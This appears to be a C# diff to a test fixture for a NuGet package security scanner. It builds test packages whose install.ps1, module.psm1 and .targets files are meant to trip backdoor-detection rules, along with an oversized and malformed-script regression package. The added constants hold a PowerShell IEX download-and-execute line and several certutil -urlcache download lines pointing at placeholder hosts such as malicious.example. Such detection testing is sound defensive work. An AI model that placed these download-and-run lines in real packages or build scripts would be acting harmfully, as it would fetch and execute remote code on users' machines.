@@ -119,6 +119,45 @@ public sealed class PackageFixture : IDisposable
             ("content/bomb.bin", new byte[50_000_000]),
         ]);
 
+        // PkgScript: script-content-scan package (ADR 0012). Carries three scripts whose text trips the embedded
+        // OSSGadget backdoor rules, plus benign identity. The .ps1 has a PowerShell IEX-download reverse-shell line
+        // and a certutil LOLBAS line; the .psm1 (now inventoried per ADR 0012) has a certutil LOLBAS line; the
+        // .targets (unknown language -> default LanguageInfo) has a certutil LOLBAS line. All tokens are original
+        // (not copied from reference/) and benign-but-matching. The lib dll is the real fixture so the assembly
+        // side of the report is unchanged in shape.
+        var pkgScriptNuspec = NupkgBuilder.NuspecXml(
+            PkgScriptId, PkgScriptVersion, "Silvergun Tests", "Script-content-scan test package.", "netstandard2.0", []);
+        PkgScriptPath = Path.Combine(rootDir, $"{PkgScriptId}.{PkgScriptVersion}.nupkg");
+        NupkgBuilder.WriteNupkg(PkgScriptPath,
+        [
+            ($"{PkgScriptId}.nuspec", Encoding.UTF8.GetBytes(pkgScriptNuspec)),
+            ($"lib/netstandard2.0/{FixtureDllName}", fixtureBytes),
+            ("tools/install.ps1", Encoding.UTF8.GetBytes(MaliciousPs1)),
+            ("tools/module.psm1", Encoding.UTF8.GetBytes(MaliciousPsm1)),
+            ($"build/{PkgScriptId}.targets", Encoding.UTF8.GetBytes(MaliciousTargets)),
+        ]);
+
+        // PkgOversize: never-throws regression for ADR 0012. Holds an oversized (>5 MiB) matching script that the
+        // scanner must skip (size cap) without crashing, a malformed/binary .ps1 that must not throw when read,
+        // and a small matching .ps1 whose finding must still surface — proving one bad unit never sinks the scan.
+        // Pad past the 5 MiB script cap with RANDOM (incompressible) bytes so the entry does NOT trip the
+        // extractor's 200:1 zip-bomb ratio cap — an all-zero/space pad would compress away and fail Open.
+        var oversizeHeader = Encoding.UTF8.GetBytes(
+            "Start-Process certutil -ArgumentList '-urlcache','-f','http://x.example/a.exe'\n");
+        var oversizeBytes = new byte[(int)(5L * 1024 * 1024) + 4096];
+        Array.Copy(oversizeHeader, oversizeBytes, oversizeHeader.Length);
+        RandomNumberGenerator.Fill(oversizeBytes.AsSpan(oversizeHeader.Length));
+        var pkgOversizeNuspec = NupkgBuilder.NuspecXml(
+            PkgOversizeId, PkgOversizeVersion, "Silvergun Tests", "Oversized/malformed-script regression package.", "netstandard2.0", []);
+        PkgOversizePath = Path.Combine(rootDir, $"{PkgOversizeId}.{PkgOversizeVersion}.nupkg");
+        NupkgBuilder.WriteNupkg(PkgOversizePath,
+        [
+            ($"{PkgOversizeId}.nuspec", Encoding.UTF8.GetBytes(pkgOversizeNuspec)),
+            ("tools/big.ps1", oversizeBytes),
+            ("tools/malformed.ps1", NupkgBuilder.NotManagedBytes),
+            ("tools/small.ps1", Encoding.UTF8.GetBytes(SmallMatchingPs1)),
+        ]);
+
         // Broken inputs: a text file renamed .nupkg, and a path that does not exist.
         FakeTextNupkgPath = Path.Combine(rootDir, "fake.nupkg");
         File.WriteAllText(FakeTextNupkgPath, "this is plain text, not a zip archive at all");
@@ -148,6 +187,39 @@ public sealed class PackageFixture : IDisposable
     public const string BombId = "PkgBomb";
     public const string BombVersion = "6.7.8";
 
+    public const string PkgScriptId = "PkgScript";
+    public const string PkgScriptVersion = "7.8.9";
+
+    public const string PkgOversizeId = "PkgOversize";
+    public const string PkgOversizeVersion = "8.9.10";
+
+    /// <summary>
+    /// PkgScript's install.ps1: a PowerShell IEX-download reverse-shell line plus a certutil LOLBAS line —
+    /// both trip the embedded OSSGadget backdoor rules. Original content, benign but rule-matching.
+    /// </summary>
+    public const string MaliciousPs1 =
+        "Write-Host 'starting install'\n" +
+        "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/stage2.ps1')\n" +
+        "Start-Process certutil -ArgumentList '-urlcache','-split','-f','http://malicious.example/payload.exe'\n";
+
+    /// <summary>PkgScript's module.psm1: a certutil LOLBAS line (language-agnostic rule, so it matches a .psm1).</summary>
+    public const string MaliciousPsm1 =
+        "function Invoke-Stage {\n" +
+        "    Start-Process certutil -ArgumentList '-urlcache','-f','http://malicious.example/mod.exe'\n" +
+        "}\n";
+
+    /// <summary>PkgScript's .targets: a certutil LOLBAS token inside an Exec, scanned via the default LanguageInfo.</summary>
+    public const string MaliciousTargets =
+        "<Project>\n" +
+        "  <Target Name=\"Run\">\n" +
+        "    <Exec Command=\" certutil -urlcache -f http://malicious.example/t.exe \" />\n" +
+        "  </Target>\n" +
+        "</Project>\n";
+
+    /// <summary>PkgOversize's small.ps1: a single certutil LOLBAS line whose finding must survive alongside the skipped huge/malformed files.</summary>
+    public const string SmallMatchingPs1 =
+        "Start-Process certutil -ArgumentList '-urlcache','-f','http://malicious.example/s.exe'\n";
+
     /// <summary>Root-level dll in PkgC (no folder segment) — classifies as <c>Role=Other</c>.</summary>
     public const string HiddenDllName = "hidden.dll";
 
@@ -163,6 +235,12 @@ public sealed class PackageFixture : IDisposable
 
     /// <summary>Decompression-bomb package: one ~50 MB all-zero entry that zips tiny (ratio far above the 200:1 cap).</summary>
     public string BombPath { get; }
+
+    /// <summary>Script-content-scan package (ADR 0012): a .ps1/.psm1/.targets that trip the embedded backdoor rules.</summary>
+    public string PkgScriptPath { get; }
+
+    /// <summary>Never-throws regression package: an oversized matching script, a malformed script, and a small matching script.</summary>
+    public string PkgOversizePath { get; }
 
     public string FakeTextNupkgPath { get; }
     public string MissingNupkgPath { get; }
